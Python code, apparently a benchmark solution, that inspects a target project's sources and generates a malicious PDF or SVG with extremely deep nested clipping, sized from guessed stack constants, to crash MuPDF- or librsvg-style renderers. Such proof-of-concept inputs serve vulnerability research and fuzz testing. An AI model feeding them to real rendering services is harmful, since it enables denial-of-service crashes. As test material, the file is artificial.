import os
import re
import tarfile
import zlib
import gzip
from collections import Counter
from typing import Iterable, Tuple, Optional


ALLOWED_EXTS = (
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
    ".rs", ".py", ".java", ".go", ".m", ".mm",
    ".cmake", "cmakelists.txt", ".gn", ".gyp", ".gypi", ".bazel",
    ".bzl", ".mk", ".am", ".ac", ".in", ".txt", ".md", ".yaml", ".yml",
    ".toml", ".gradle", ".js", ".ts"
)


def _iter_source_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                l = fn.lower()
                if not any(l.endswith(ext) for ext in ALLOWED_EXTS):
                    continue
                try:
                    st = os.stat(p)
                    if st.st_size > 10_000_000:
                        continue
                    with open(p, "rb") as f:
                        yield p, f.read()
                except OSError:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf:
                if not m.isfile():
                    continue
                name = m.name
                lname = name.lower()
                ok = False
                for ext in ALLOWED_EXTS:
                    if lname.endswith(ext):
                        ok = True
                        break
                if not ok:
                    continue
                if m.size > 10_000_000:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                yield name, data
    except Exception:
        return


def _build_pdf_with_nested_clips(depth: int) -> bytes:
    # Each level: save state + apply a degenerate clip
    # Then restore depth times. The repeated pattern compresses extremely well.
    if depth < 1:
        depth = 1
    pattern = b"q 0 0 0 0 re W n\n"
    content = pattern * depth + (b"Q\n" * depth)
    comp = zlib.compress(content, 9)

    header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"

    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R /Resources << >> >>\nendobj\n"
    obj4 = (
        b"4 0 obj\n<< /Length " + str(len(comp)).encode("ascii") +
        b" /Filter /FlateDecode >>\nstream\n" + comp +
        b"\nendstream\nendobj\n"
    )

    parts = [header, obj1, obj2, obj3, obj4]
    offsets = [0]
    cur = 0
    for p in parts:
        offsets.append(cur)
        cur += len(p)

    # offsets: [0, header_start(0), obj1_start, obj2_start, obj3_start, obj4_start]
    # xref wants object 0..4; we need offsets for objects 1..4
    obj1_off = offsets[2]
    obj2_off = offsets[3]
    obj3_off = offsets[4]
    obj4_off = offsets[5]

    xref_off = cur
    xref = bytearray()
    xref += b"xref\n0 5\n"
    xref += b"0000000000 65535 f \n"
    for off in (obj1_off, obj2_off, obj3_off, obj4_off):
        xref += f"{off:010d} 00000 n \n".encode("ascii")

    trailer = (
        b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n" +
        str(xref_off).encode("ascii") + b"\n%%EOF\n"
    )

    return b"".join(parts) + bytes(xref) + trailer


def _build_svg_nested_groups(depth: int) -> bytes:
    if depth < 1:
        depth = 1
    # Keep tags short and repetitive for potential gzip compression by the consumer.
    pre = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<defs><clipPath id="a"><rect width="1" height="1"/></clipPath></defs>'
    )
    open_tag = b'<g clip-path="url(#a)">'
    close_tag = b"</g>"
    body = open_tag * depth + b"<rect/>" + close_tag * depth
    post = b"</svg>"
    return pre + body + post


def _analyze_source_for_format_and_depth(src_path: str) -> Tuple[str, int, bool]:
    pdf_score = 0
    svg_score = 0
    gzip_svg_score = 0

    fuzzer_pdf = 0
    fuzzer_svg = 0

    clip_stack_nums = Counter()

    # Strong signals for MuPDF-like PDF rendering
    pdf_indicators = (
        b"fz_open_document",
        b"fz_open_document_with_stream",
        b"fz_new_context",
        b"pdf_document",
        b"pdf_open_document",
        b"pdf_load_document",
        b"%pdf",
    )
    # Strong signals for SVG-only rendering (e.g., librsvg)
    svg_indicators = (
        b"rsvg_handle_new_from_data",
        b"rsvg_handle_write",
        b"rsvg_handle_read_stream",
        b"xmlreadmemory",
        b"svg",
        b"<svg",
    )
    gzip_indicators = (
        b"svgz",
        b"gzip",
        b"gzdecoder",
        b"gzdirect",
        b"inflate",
        b"zlibdecompressor",
        b"gzlibdecompressor",
    )

    max_read = 4_000_000

    for name, data in _iter_source_files(src_path):
        if not data:
            continue
        if len(data) > max_read:
            data = data[:max_read]

        low = data.lower()

        if b"llvmfuzzertestoneinput" in low or b"fuzzer_test_one_input" in low:
            for ind in pdf_indicators:
                if ind in low:
                    fuzzer_pdf += 2
            if b"pdf" in low:
                fuzzer_pdf += 1
            if b"rsvg" in low or b"xmlreadmemory" in low:
                fuzzer_svg += 2
            if b"svg" in low and b"pdf" not in low:
                fuzzer_svg += 1

        for ind in pdf_indicators:
            if ind in low:
                pdf_score += 1
        for ind in svg_indicators:
            if ind in low:
                svg_score += 1
        for ind in gzip_indicators:
            if ind in low:
                gzip_svg_score += 1

        if (b"clip" in low) and (b"stack" in low or b"nest" in low or b"layer" in low):
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                continue
            for line in text.splitlines():
                l = line.lower()
                if "clip" not in l:
                    continue
                if ("stack" not in l) and ("nest" not in l) and ("layer" not in l):
                    continue
                for num in re.findall(r"\b\d{2,7}\b", l):
                    n = int(num)
                    if 16 <= n <= 1_000_000:
                        clip_stack_nums[n] += 1

    # Format decision:
    # Prefer PDF if it seems supported, because we can embed large repetition compactly (FlateDecode).
    if fuzzer_svg > 0 and fuzzer_pdf == 0:
        fmt = "svg"
    elif fuzzer_pdf > 0:
        fmt = "pdf"
    else:
        fmt = "pdf" if pdf_score >= svg_score else "svg"

    # Depth decision:
    # Try to infer a stack/depth constant from sources. Otherwise pick a moderate value.
    inferred = None
    if clip_stack_nums:
        # Choose most frequent; break ties by choosing larger.
        best_val = None
        best_key = (-1, -1)
        for val, cnt in clip_stack_nums.items():
            key = (cnt, val)
            if key > best_key:
                best_key = key
                best_val = val
        inferred = best_val

    # Default values biased by the given ground-truth (~0.9MB likely from many repeated tokens).
    # Cap to keep runtime and memory safe.
    if inferred is None:
        depth = 100_000
    else:
        depth = inferred + 128

    if depth < 512:
        depth = 2048
    if depth > 200_000:
        depth = 200_000

    use_svg_gzip = (gzip_svg_score > 0) or (fuzzer_svg > 0 and gzip_svg_score > 0)
    return fmt, depth, use_svg_gzip


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt, depth, use_svg_gzip = _analyze_source_for_format_and_depth(src_path)

        if fmt == "svg":
            svg = _build_svg_nested_groups(depth)
            if use_svg_gzip:
                return gzip.compress(svg, compresslevel=9)
            return svg

        return _build_pdf_with_nested_clips(depth)